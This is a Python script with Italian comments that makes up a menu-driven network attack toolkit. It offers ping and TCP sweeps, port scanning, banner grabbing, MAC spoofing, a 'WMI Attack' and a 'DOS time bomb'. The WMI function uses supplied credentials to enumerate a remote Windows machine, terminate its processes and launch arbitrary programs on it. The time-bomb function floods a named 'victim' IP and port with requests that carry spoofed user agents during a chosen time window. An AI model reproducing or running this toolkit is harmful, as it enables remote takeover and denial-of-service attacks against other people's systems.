# Importo le librerie
import os, socket, subprocess, time, wmi, sys, contextlib, requests
import fake_useragent, netifaces, uuid, subprocess
from datetime import datetime
from bs4 import BeautifulSoup
from colorama import Fore #BLACK, RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN, WHITE
from colorama import Style #DIM, NORMAL, BRIGHT, RESET_ALL
# Variabili
verde = Fore.GREEN
reset = Style.RESET_ALL
blu = Fore.BLUE
rosso = Fore.LIGHTRED_EX #Colora Rosso e rende il testo brillante
opaco = Style.DIM
brillante = Style.BRIGHT
giallo = Fore.YELLOW
#Info
with open('Info.txt', encoding='utf8') as f:
     print(verde + f.read() + reset,'\n')
#Analisi dei dati di rete
hostname = socket.gethostname()
ipAddress = socket.gethostbyname(hostname)
publicIp = requests.get('https://checkip.amazonaws.com').text.strip()
print(f"Hostname: {hostname}")
print("IP locale: ", ipAddress)
print("IP pubblico: ", publicIp, '\n')
time.sleep(1) #Pausa     
#Menu
def menu():
    print(giallo + """
\t----------- MENU ------------
\t 1. Ottieni IP dal nome host
\t 2. Ping Sweep
\t 3. Traceroute
\t 4. TCP Sweep
\t 5. Porta Scanning
\t 6. Banner Grabber
\t 7. Data hyperlink website
\t 8. MAC spoofing
\t 9. WMI Attack
\t 10. DOS time bomb                              
\t 11. Exit
""" + reset)
#Lista azioni    
def control():
    ctrl = input("Effettua La Scelta: ")
    if ctrl == "1" :
        hostIP() #Controlla ip host
    elif ctrl == "2" :
        ping() #Ping Sweep
    elif ctrl == "3" :
        traceroute() #Traceroute
    elif ctrl == "4" :
        tcp_sweep() #TCP Sweep
    elif ctrl == "5" :
        port_scanner() #Porta Scanning
    elif ctrl == "6" :
        banner_grabber() #Banner Grabber
    elif ctrl == "7" :
        get_hyperlink() #Data hyperlink website
    elif ctrl == "8" :
        MAC() #MAC spoofing
    elif ctrl == "9" :
        wmi_attack() #WMI Attack
    elif ctrl == "10" :
        dos_timebomb() #DOS time bomb
    elif ctrl == "11" :
        sys.exit()
    else :
        print(rosso + "Scelta Errata" + reset)
    
def hostIP():
    host=input("Inserisci url senza www: ")
    ipAddress   = socket.gethostbyname(host)
    print("L'IP del nome host {} è: {}".format(host, ipAddress))

def ping():
    net = input("Indirizzo IP di destinazione: ")
    net1= net.split('.')
    a = '.'
    net2 = net1[0]+a+net1[1]+a+net1[2]+a
    st1 = int(input("Primo numero: "))
    en1 = int(input("Ultimo numero: "))
    en1=en1+1
    t1= datetime.now()
    print ("Scansione ping in corso... ")
    #Apri il file in modalità scrittura
    with open("risultati_ping.txt", "w") as file:
    # Reindirizza l'output di print sul file
        with contextlib.redirect_stdout(file):
            for ip in range(st1,en1):
                alamat = net2+str(ip)
                res = subprocess.call(['ping', alamat]) 
                if res == 0: print( "ping", alamat, "OK") 
    t2= datetime.now()
    total =t2-t1
    print ("Terminato in: ",total)

def traceroute():
    ip=input("Indirizzo IP di destinazione: ")
    results=os.popen("percorso "+str(ip))	
    for i in results:print (i)

def tcp_sweep():
    net= input("Indirizzo IP di destinazione: ")
    net1= net.split('.')
    a = '.'
    net2 = net1[0]+a+net1[1]+a+net1[2]+a
    st1 = int(input("Primo numero IP: "))
    en1 = int(input("Ultimo numero IP: "))
    port = int(input("Numero di porta: "))
    en1=en1+1
    t1= datetime.now()
    print ("Scansione in corso... ")
    def scan(addr):
        s= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        socket.setdefaulttimeout(1)
        result = s.connect_ex((addr,port))
        if result==0:return 1
        else :return 0
    def run1():
        # Crea o apri un file chiamato "risultati.txt" in modalità scrittura
        file = open("risultati_TCP.txt", "w")
        for ip in range(st1,en1):
            addr = net2+str(ip)
            if (scan(addr)):
                print (addr , "connesso")
                # Scrivi l'indirizzo IP connesso nel file
                file.write(addr + " connesso\n")
        # Chiudi il file
        file.close()
    run1()
    t2= datetime.now()
    total =t2-t1
    print ("La scansione è termina in: " , total)

def port_scanner():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host = input('Target IP: ')
    start = input('Porta iniziale: ')
    end = input('Porta finale: ')
    start = int(start)
    end = int(end)
    if start < 1 or start > 65535 or end < 1 or end > 65535 or start > end:
       print("Valori non validi. Le porte devono essere comprese tra 1 e 65535 e la porta iniziale deve essere minore o uguale alla porta finale.")
       port_scanner() 
    open_ports = 0
    closed_ports = 0
    t1 = time.time()
    print("Scansione in corso...")
    f = open("risultati_port.txt", "a")
    f.write(f"Scansione di {host} da {start} a {end}\n")
    for port in range(start, end + 1):
        result = s.connect_ex((host, port))
        if result == 0:
            print(f"La porta {port} di {host} è aperta")
            open_ports += 1
            f.write(f"La porta {port} di {host} è aperta\n")
        else:
            print(f"La porta {port} di {host} è chiusa")
            closed_ports += 1
    t2 = time.time()
    scan_time = t2 - t1
    s.close()
    print(f"Su {host} ci sono {open_ports} porte aperte e {closed_ports} porte chiuse")
    print(f"Il tempo totale di scansione è {scan_time:.2f} secondi")
    f.write(f"Su {host} ci sono {open_ports} porte aperte e {closed_ports} porte chiuse\n")
    f.write(f"Il tempo totale di scansione è {scan_time:.2f} secondi\n")
    f.close()

def banner_grabber():
        alamat= input("Indirizzo IP: ")
        ports = [21, 25, 80]
        print("Verifica in corso...")
        for port in ports:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(60)
            result= s.connect_ex((alamat,port))
            if result==0:
                if port==80: s.send(b'GET / HTTP/1.1\r\n\r\n')
                try:
                    banner = s.recv(4096)
                    print (f"La porta {port} di {alamat} è aperta")
                    print (banner.decode('ascii'))
                except:print ("Non sono riuscito a trovare nessun banner")
                finally:s.close()
            else:
                print (f"La porta {port} di {alamat} è chiusa")
                s.close()

def get_hyperlink():
    url = input("Inserisci l'URL del sito web: ")
    page = requests.get(url)
    soup = BeautifulSoup(page.content, "html.parser")
    print("Dati salvati nella cartella principale")
    f = open("hyperlink.txt", "w")
    for link in soup.find_all("a", href=True):
        f.write(link["href"] + "\n")
    f.close()

def MAC():
    interface = netifaces.gateways()["default"][netifaces.AF_INET][1]
    print(f"L'interfaccia che stai usando è {verde}{interface}{reset}")
    mac_address = uuid.uuid4().hex[:12]
    print(f"Indirizzo MAC generato è: {verde}{mac_address}{reset}")
    confirm = input("Vuoi usare il MAC generato? (s/n): ")
    if confirm.lower() == "s":
        new_mac = mac_address
    else:
        new_mac = input("Inserisci il nuovo indirizzo MAC: ")
    subprocess.run(["ipconfig", "/release", interface])
    subprocess.run(["ipconfig", "/setclassid", interface, new_mac])
    subprocess.run(["ipconfig", "/renew", interface])
    print(f"L'indirizzo MAC di {verde}{interface}{reset} è stato cambiato in {verde}{new_mac}{reset}")

def wmi_attack():
    ip=input("Inserire indirizzo IP: ")
    username=input("Username: ")
    passwd=input("Password: ")
    print("Connessione in corso...")
    try:
        c = wmi.WMI(ip,user=username,password=passwd)
        for os in c.Win32_OperatingSystem():print (os.Caption) 
        isJalan1=input("Visualizzare l'elenco delle unità fisse? (sì/no)")
        if isJalan1=="si":
            print ("--------Drive---------")
            for disk in c.Win32_LogicalDisk(DriveType=3):print (disk)
        isJalan2=input("Visualizzare l'elenco delle destinazioni dei servizi Windows? (si/no)")
        if isJalan2=="si":
            print ("--------Servizi Windows---------")
            for service in c.Win32_Service(State="Running"):print (service.Name)
        isJalan3=input("Visualizza l'elenco delle applicazioni Windows in esecuzione? (sì/no)")
        if isJalan3=="si":
            for i in c.Win32_Process(["Caption", "ProcessID"]):print (i.Caption, i. ProcessID)
            dead=input("Vuoi terminare un processo? (sì/no)")
            if dead=="si":
                noid=input("id del programma da terminare?")
                c.Win32_Process(ProcessId=noid)[0].Terminate()
        isJalan4=input("Vuoi vedere l'elenco degli utenti di Windows? (sì/no)")
        if isJalan4=="si":
            for group in c.Win32_Group():
                print (group.Caption+":")
                for user in group.associators(wmi_result_class="Win32_UserAccount"):print ("- " + user.Caption)
        isJalan5=input("Eseguire un'applicazione dal computer remoto? (sì/no")
        if isJalan5=="si":
            aplikasi=input("Nome dell'applicazione")
            SW_SHOWNORMAL = 1
            try:
                process_startup = c.Win32_ProcessStartup.new()
                process_startup.ShowWindow = SW_SHOWNORMAL
                process_id, result = c.Win32_Process.Create(CommandLine=aplikasi, ProcessStartupInformation=process_startup)
                if result == 0:print ("Il processo è iniziato con successo: %d" % process_id)
                else:print ("Fallito")
            except:print ("Errore")
    except:print ("Fallito")

def dos_timebomb():
    alamat = input("Indirizzo IP della vittima: ")
    port = input("Porta: ")
    awal = input("Ora di inizio (HH:MM): ")
    akhir = input("Ora di fine (HH:MM): ")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ua = fake_useragent.UserAgent()
    waktu = time.strftime("%H:%M", time.localtime())
    count = 0
    start = time.time()
    print("Attacco in corso...")
    while time.strptime(waktu, "%H:%M") <= time.strptime(awal, "%H:%M"):
            try:
                result = s.connect_ex((alamat, int(port)))
                if port == 80:
                    s.send(b'GET / HTTP/1.1\r\nUser-Agent: ' + ua.random.encode() + b'\r\n\r\n')
                s.send(b'Serangaaaaaaaaaan')
                count += 1
            except:
                s.close()
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            waktu = time.strftime("%H:%M", time.localtime())
            if time.strptime(waktu, "%H:%M") >= time.strptime(akhir, "%H:%M"):
                break
    s.close()
    end = time.time()
    print(f"Richieste inviate: {count}")
    print(f"Tempo trascorso: {round((end - start) / 60, 2)} minuti")

#Ricomincia il programma
while True:
 menu()
 control() 